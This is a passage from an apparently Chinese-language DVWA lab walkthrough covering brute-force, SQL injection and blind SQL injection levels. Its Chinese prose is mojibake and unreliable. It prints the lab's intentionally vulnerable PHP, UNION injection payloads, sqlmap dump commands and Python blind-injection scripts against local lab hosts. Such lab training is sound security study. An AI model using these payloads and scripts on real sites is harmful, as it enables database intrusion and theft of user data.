&quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed sleep( 2 ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; ä¸lowçº§åˆ«ç›¸æ¯”è¾ƒï¼Œåªæ˜¯å¢åŠ äº†å›æ˜¾çš„æ—¶é—´ï¼Œæ‰€ä»¥è¿˜æ˜¯å¯ä»¥ä½¿ç”¨lowçº§åˆ«çš„æ–¹æ³•ç›´æ¥çˆ†ç ´ï¼Œä¸è¿‡èŠ±è´¹çš„æ—¶é—´ç›¸å¯¹ä¼šé•¿ä¸€ç‚¹ã€‚ 1.ç«ç‹æµè§ˆå™¨æ‰“å¼€ä»£ç†æŠ“åŒ…åå‘åˆ°çˆ†ç ´æ¨¡å—ï¼Œæ·»åŠ çˆ†ç ´çš„å˜é‡ã€‚ 2.åŠ è½½å¯†ç å­—å…¸è¿›è¡Œçˆ†ç ´ã€‚ 3.æ ¹æ®å“åº”åŒ…çš„é•¿åº¦ç¡®å®šæ­£ç¡®å¯†ç ã€‚ high&lt;?php if( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Sanitise username input $user = $_GET[ &#x27;username&#x27; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &#x27;password&#x27; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; å®¡è®¡ä»£ç åå¯ä»¥å‘ç°ä½¿ç”¨äº†éšæœºtokenæœºåˆ¶æ¥é˜²æ­¢CSRFï¼Œä»è€Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šé˜²æ­¢äº†é‡æ”¾æ”»å‡»ï¼Œå¢åŠ äº†çˆ†ç ´éš¾åº¦ï¼Œä½†æ˜¯ä»»ç„¶å¯ä»¥ä½¿ç”¨bpçš„çˆ†ç ´æ¨¡å— 1.æŠ“åŒ…ï¼Œå‘åŒ…åˆ°çˆ†ç ´æ¨¡å—å¹¶æ·»åŠ å‚æ•°ï¼Œè¿™æ¬¡éœ€è¦æ·»åŠ ä¸¤ä¸ªå‚æ•°ï¼Œè®¾ç½® passwordå’Œuser_tokenä¸ºå˜é‡ 2.æ”»å‡»ç±»å‹é€‰æ‹©pitchforkï¼Œæ„æ€æ˜¯è‰å‰æ¨¡å¼ï¼ˆPitchfork ï¼‰â€”â€”å®ƒå¯ä»¥ä½¿ç”¨å¤šç»„Payloadé›†åˆï¼Œåœ¨æ¯ä¸€ä¸ªä¸åŒçš„Payloadæ ‡å¿—ä½ç½®ä¸Šï¼ˆæœ€å¤š20ä¸ªï¼‰ï¼Œéå†æ‰€æœ‰çš„Payloadã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœæœ‰ä¸¤ä¸ªPayloadæ ‡å¿—ä½ç½®ï¼Œç¬¬ä¸€ä¸ªPayloadå€¼ä¸ºAå’ŒBï¼Œç¬¬äºŒä¸ªPayloadå€¼ä¸ºCå’ŒDï¼Œåˆ™å‘èµ·æ”»å‡»æ—¶ï¼Œå°†å…±å‘èµ·ä¸¤æ¬¡æ”»å‡»ï¼Œç¬¬ä¸€æ¬¡ä½¿ç”¨çš„Payloadåˆ†åˆ«ä¸ºAå’ŒCï¼Œç¬¬äºŒæ¬¡ä½¿ç”¨çš„Payloadåˆ†åˆ«ä¸ºBå’ŒDã€‚ 3.è®¾ç½®å‚æ•°ï¼Œåœ¨optioné€‰é¡¹å¡ä¸­å°†æ”»å‡»çº¿ç¨‹threadè®¾ç½®ä¸º1ï¼Œå› ä¸ºRecursive_Grepæ¨¡å¼ä¸æ”¯æŒå¤šçº¿ç¨‹æ”»å‡»ï¼Œç„¶åé€‰æ‹©Grep-Extractï¼Œæ„æ€æ˜¯ç”¨äºæå–å“åº”æ¶ˆæ¯ä¸­çš„æœ‰ç”¨ä¿¡æ¯ï¼Œç‚¹å‡»Addï¼Œå¦‚ä¸‹å›¾è¿›è¡Œè®¾ç½®ï¼Œæœ€åå°†Redirectionsè®¾ç½®ä¸ºAlways 4.è®¾ç½®payloadï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¯†ç ä¸ä¹‹å‰ä¸¤æ¬¡ä¸€æ ·ï¼ŒåŠ è½½å¯†ç å­—å…¸å³å¯ï¼Œç¬¬äºŒtokenå‚æ•°é€‰æ‹©Recursive grepï¼Œç„¶åå°†optionsä¸­çš„tokenä½œä¸ºç¬¬ä¸€æ¬¡è¯·æ±‚çš„åˆå§‹å€¼ã€‚ 5.start attack,è¿˜æ˜¯æ ¹æ®å“åº”åŒ…é•¿åº¦çš„ä¸åŒæ‰¾åˆ°åŒ…å«çœŸæ­£å¯†ç çš„è¯·æ±‚åŒ…ï¼Œè·å–æ­£ç¡®å¯†ç ã€‚ SQL Injectionlow&lt;?php if( isset( $_SESSION [ &#x27;id&#x27; ] ) ) &#123; // Get input $id = $_SESSION[ &#x27;id&#x27; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;æ³¨å…¥ç‚¹å°±åœ¨è¿™å¥ä»£ç ä¸­ æ‰‹å·¥æ³¨å…¥1.åˆ¤æ–­æ³¨å…¥ç±»å‹1 or 1=1 # 1&#x27; or 1=1 # å¯çŸ¥æ˜¯å­—ç¬¦å‹æ³¨å…¥ 2.åˆ¤æ–­å¤šå°‘å­—æ®µæ•°1&#x27; order by 1,2,3 # æŠ¥é”™ 1&#x27; order by 1,2 # æ˜¾ç¤ºæ­£å¸¸ï¼Œè¯´æ˜åªæœ‰2ä¸ªå­—æ®µ 3.ç¡®è®¤æ˜¾ç¤ºé¡ºåº ä¸¤ä¸ªä½ç½®éƒ½å¯ä»¥ä½¿ç”¨ 4.unionæŸ¥è¯¢1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# 1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; # 1&#x27; union select 1,group_concat(fl4g) from flag # sqlmapæ³¨å…¥python2 sqlmap.py -u &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot; --batch --dbs python2 sqlmap.py -u &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot; --batch -D dvwa -T flag --columns python2 sqlmap.py -u &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot; --batch -D dvwa -T flag -C fl4g --dump mediumä¸lowçº§åˆ«ç›¸æ¯”è¾ƒï¼Œè¿™é‡Œçš„idå€¼ä¸éœ€è¦ç”¨æˆ·è¾“å…¥ï¼Œåªéœ€è¦é€‰æ‹©ï¼Œä½†æ˜¯å¯ä»¥æŠ“åŒ…ä¿®æ”¹idçš„å†…å®¹ æ‰‹å·¥æ³¨å…¥ç»è¿‡æµ‹è¯•æ˜¯æ•°å­—å‹æ³¨å…¥ï¼Œå¾ˆç®€å•çš„åˆ¤æ–­å°±ä¸æˆªå›¾äº† 1.åˆ¤æ–­åˆ—æ•°id=1 order by 1,2#&amp;Submit=Submit æ­¤æ—¶é¡µé¢æ­£å¸¸ id=1 order by 1,2,3#&amp;Submit=Submit æ­¤æ—¶é¡µé¢æŠ¥é”™ Unknown column &#39;3&#39; in &#39;order clause&#39; æ‰€ä»¥å¯çŸ¥ä¸ºä¸¤åˆ—ï¼Œä¹‹åçš„æ“ä½œä¸lowçº§åˆ«çš„ä¸€æ · 2.unionæŸ¥è¯¢çˆ†æ•°æ®åº“å id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&amp;Submit=Submit çˆ†åˆ—å id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x666c6167 #&amp;Submit=Submit è¯»å–flag id=-1 union select 1,group_concat(fl4g) from flag #&amp;Submit=Submit è¿™é‡Œè¯»å–åˆ—åçš„æ—¶å€™éœ€è¦æ³¨æ„ä½¿ç”¨åˆ—åçš„åå…­è¿›åˆ¶ï¼Œä¸ç„¶å°±ä¼šæŠ¥é”™ï¼Œåº”è¯¥æ˜¯ &#39;è¢« \\è½¬ä¹‰äº†ï¼Œå¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶ç»•è¿‡ åˆ†ææºç  &lt;?php if( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $id = $_POST[ &#x27;id&#x27; ]; $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id); $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &#x27;&lt;pre&gt;&#x27; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &#x27;&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Display values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; &#125; // This is used later on in the index.php page // Setting it here so we can close the database connection in here like in the rest of the source scripts $query = &quot;SELECT COUNT(*) FROM users;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); $number_of_rows = mysqli_fetch_row( $result )[0]; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); ?&gt; mysqli_real_escape_string() å‡½æ•°è½¬ä¹‰åœ¨ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚ æ‰€ä»¥å¯¼è‡´äº†å•å¼•å·è¢«è½¬ä¹‰çš„ç»“æœ sqlmapæ³¨å…¥å› ä¸ºæ˜¯postæ³¨å…¥ï¼Œæ‰€ä»¥éœ€è¦æŠ“å–æ•°æ®åŒ…ä¿å­˜ä¸‹æ¥ã€‚ å¦‚å›¾ï¼Œå¯ä»¥å°†å…¶ä¿å­˜åœ¨sqlmap.pyçš„è·¯å¾„ä¸‹ æ³¨å…¥è¿‡ç¨‹python2 .\\sqlmap.py -r .\\a.txt --batch --dbs python2 .\\sqlmap.py -r .\\a.txt --batch -D dvwa --tables python2 .\\sqlmap.py -r .\\a.txt --batch -D dvwa -T flag --columns python2 .\\sqlmap.py -r .\\a.txt --batch -D dvwa -T flag -C fl4g --dump highè¿™æ¬¡ç”¨æˆ·è¾“å…¥ä¸å›æ˜¾ä¸åœ¨åŒä¸€ä¸ªé¡µé¢ï¼Œè¿™åªè¦æ˜¯ä¸ºäº†é˜²æ­¢sqlmapè¿™ç§è‡ªåŠ¨åŒ–æ³¨å…¥å·¥å…·çš„æ”»å‡» æ³¨å…¥ç›´æ¥ä½¿ç”¨lowçº§åˆ«çš„payloadï¼š 1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# 1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; # 1&#x27; union select 1,group_concat(fl4g) from flag # æºç åˆ†æ &lt;?php if( isset( $_SESSION [ &#x27;id&#x27; ] ) ) &#123; // Get input $id = $_SESSION[ &#x27;id&#x27; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;; å­˜åœ¨æ³¨å…¥çš„è¯­å¥åªæ˜¯åœ¨lowçº§åˆ«çš„åŸºç¡€ä¸ŠåŠ ä¸Šäº†Limité™åˆ¶äº†å›æ˜¾çš„è¡Œæ•°ï¼Œä½†æ˜¯ä½¿ç”¨lowçº§åˆ«çš„æ³¨å…¥è¯­å¥æ—¶ä¼šç›´æ¥æŠŠLimit 1æ³¨é‡Šæ‰ï¼Œæ‰€ä»¥å®Œå…¨ä¸lowçº§åˆ«ä¸€æ ·ã€‚ SQL Injection (Blind)ç›²æ³¨çš„è¿‡ç¨‹ï¼Œå°±åƒä½ ä¸ä¸€ä¸ªæœºå™¨äººèŠå¤©ï¼Œè¿™ä¸ªæœºå™¨äººçŸ¥é“çš„å¾ˆå¤šï¼Œä½†åªä¼šå›ç­”â€œæ˜¯â€æˆ–è€…â€œä¸æ˜¯â€ï¼Œå› æ­¤ä½ éœ€è¦è¯¢é—®å®ƒè¿™æ ·çš„é—®é¢˜ï¼Œä¾‹å¦‚â€œæ•°æ®åº“åå­—çš„ç¬¬ä¸€ä¸ªå­—æ¯æ˜¯ä¸æ˜¯aå•Šï¼Ÿâ€ï¼Œé€šè¿‡è¿™ç§æœºæ¢°çš„è¯¢é—®ï¼Œæœ€ç»ˆè·å¾—ä½ æƒ³è¦çš„æ•°æ®ã€‚ lowæ‰‹å·¥åŠ è„šæœ¬æŸ¥è¯¢æˆåŠŸè¿”å›çš„è¯­å¥ï¼šUser ID exists in the database. æŸ¥è¯¢å¤±è´¥è¿”å›çš„è¯­å¥ï¼šUser ID is MISSING from the database. è¿™æ ·å°±å¯ä»¥åˆ©ç”¨æç¤ºä¿¡æ¯ç¡®å®šï¼Œæˆ‘ä»¬æ‰€æŸ¥è¯¢çš„è¯­å¥æ˜¯å¦æ­£ç¡® é¦–å…ˆç¡®å®šç›²æ³¨çš„è¯­å¥ é€šè¿‡ä¸‹é¢çš„æµ‹è¯•ï¼Œè¯´æ˜asciiå‡½æ•°æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œå†™æ³¨å…¥çš„è„šæœ¬ï¼ŒäºŒåˆ†æ³•æ›´å¿«ç‚¹ã€‚ 1&#x27; and ascii(substring(database(),1,1))&gt;50 # æç¤º ï¼šUser ID exists in the database. 1&#x27; and ascii(substring(database(),1,1))&lt;50 # æç¤ºï¼š User ID is MISSING from the database. # -*- coding = utf - 8 -*- #@Time : 2020/10/26 17:29 #@Author : sunzy #@File : dvwa.py # äºŒåˆ†æ³•ç›²æ³¨ import requests url = &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=&quot; header = &#123;&quot;Cookie&quot;: &quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot;&#125; flag = &quot;&quot; for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): #è·å–æ•°æ®åº“å #payload = &quot;1&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid) #è·å–è¡¨å #payload = &quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) #è·å–åˆ—å #payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) #è·å–flag payload = &quot;1&#x27; and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) url1 =url+payload+&quot;&amp;Submit=Submit#&quot; response = requests.post(url1,headers= header) if &quot;exists&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 flag = flag + chr(mid) print(flag) 1.é¦–å…ˆè·å–è¡¨å ä½¿ç”¨payload: payload = &quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) 2.è·å–åˆ—å ä½¿ç”¨payload payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) 3.è·å–flag ä½¿ç”¨payload payload = &quot;1&#x27; and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) sqlmappython2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; --dbs --batch python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; -D dvwa --tables --batch python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; -D dvwa -T flag --columns --batch python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; -D dvwa -T flag -C fl4g --dump --batch mediumæ‰‹å·¥åŠ è„šæœ¬ä¸lowçº§åˆ«ä¸åŒï¼Œä¸­çº§åˆ«æäº¤æ•°æ®æ˜¯postç±»å‹ï¼Œæ‰€ä»¥éœ€è¦æŠ“åŒ…åå†æäº¤ã€‚ id=1 and length(database())=4 #&amp;Submit=Submit æç¤ºUser ID exists in the database. id=1 and length(database())=5 #&amp;Submit=Submit User ID is MISSING from the database æ‰€ä»¥æ€è·¯è¿˜æ˜¯ä¸lowçº§åˆ«ä¸€æ ·ï¼Œåªä¸è¿‡è„šæœ¬ä¸­æäº¤æ•°æ®çš„æ–¹å¼æ”¹ä¸ºPOSTç±»å‹ ç›´æ¥ä¸Šè„šæœ¬ import requests url = &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; header = &#123;&quot;Cookie&quot;: &quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;&#125; flag = &quot;&quot; t = &quot;&quot; sum=0 for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): #payload = &quot;1 and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid) #payload = &quot;1 and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) #payload = &quot;1 and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) payload = &quot;1 and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) data = &#123;&#x27;id&#x27;: payload, &#x27;Submit&#x27;: &#x27;Submit&#x27;&#125; response = requests.post(url,headers = header,data=data) t = response.text if &quot;exists&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 print(mid) flag = flag + chr(mid) print(flag) sqlmappython2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; --data &quot;id=1&amp;Submit=Submit&quot; -p &quot;id&quot; --cookie &quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; --dbs python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; --data &quot;id=1&amp;Submit=Submit&quot; -p &quot;id&quot; --cookie &quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; -D dvwa --tables python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; --data &quot;id=1&amp;Submit=Submit&quot; -p &quot;id&quot; --cookie &quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; -D dvwa -T flag --columns python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; --data &quot;id=1&amp;Submit=Submit&quot; -p &quot;id&quot; --cookie &quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; -D dvwa -T flag -C fl4g --dump sqlmapä¸­ç»™äº†ä¸‰ç§æ³¨å…¥æ–¹å¼ï¼Œå¹¶ä¸”ç»™å‡ºäº†payloadï¼Œå¯ä»¥åŸºäºç»™å‡ºçš„æç¤ºç»§ç»­åšä¸‹å» ä¸‹é¢æ˜¯sqlmapçˆ†å‡ºçš„flagã€‚ æºç åˆ†æ &lt;?php if( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $id = $_POST[ &#x27;id&#x27; ]; $id = mysql_real_escape_string( $id ); // Check database $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysql_query( $getid ); // Removed &#x27;or die&#x27; to suppress mysql errors // Get results $num = @mysql_numrows( $result ); // The &#x27;@&#x27; character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;; &#125; else &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;; &#125; //mysql_close(); &#125; ?&gt; mysql_real_escape_string() è°ƒç”¨mysqlåº“çš„å‡½æ•° mysql_real_escape_string, åœ¨ä»¥ä¸‹å­—ç¬¦å‰æ·»åŠ åæ–œæ : \\x00, \\n, \\r, \\, &#39;, &quot; å’Œ \\x1a. æœ¬è´¨ä¸Šè·Ÿlowçº§åˆ«çš„æ²¡æœ‰å¤ªå¤§çš„åŒºåˆ«ï¼Œåªæ˜¯å°†ä¸€äº›ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ï¼Œä½†æ˜¯æˆ‘ä»¬æ³¨å…¥æ—¶æ²¡æœ‰ç”¨åˆ°è¿™äº›å­—ç¬¦ï¼Œæ‰€ä»¥æ³¨å…¥è¯­å¥åŸºæœ¬å’Œlowçº§åˆ«ä¸€æ · highGET /dvwa/vulnerabilities/sqli_blind/ HTTP/1.1 Host: 10.5.8.66 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Referer: http://10.5.8.66/dvwa/vulnerabilities/sqli/ Connection: close Cookie: id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1 Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 æŠ“åŒ…åå¯ä»¥å‘ç°æäº¤çš„å‚æ•°idåœ¨cookieä¸­ï¼Œæ‰€ä»¥ä¸ä¸­çº§åˆ«çš„æ–¹æ³•ä¸ä¸€æ ·äº†ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥ä½¿ç”¨sqlmapæ³¨å…¥ã€‚ æ‰‹å·¥åŠ è„šæœ¬é€šè¿‡æ‰‹å·¥æµ‹è¯•å‘ç°æ˜¯å­—ç¬¦å‹æ³¨å…¥ï¼Œä¸lowçº§åˆ«çš„è„šæœ¬å¤§åŒå°å¼‚ï¼Œåªæ˜¯å°†æ³¨å…¥çš„ä½ç½®æ”¹åˆ°äº†cookieçš„ä½ç½® import requests url = &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; t=&quot;&quot; flag = &quot;&quot; for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): #payload = &quot;1&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid) payload = &quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) #payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) #payload = &quot;1&#x27; and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) id = payload header = &#123;&quot;Cookie&quot;: &quot;id=&quot;+payload+&quot;;&quot;+&quot;security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;&#125; #print(header) response = requests.post(url,headers = header) t = response.text if 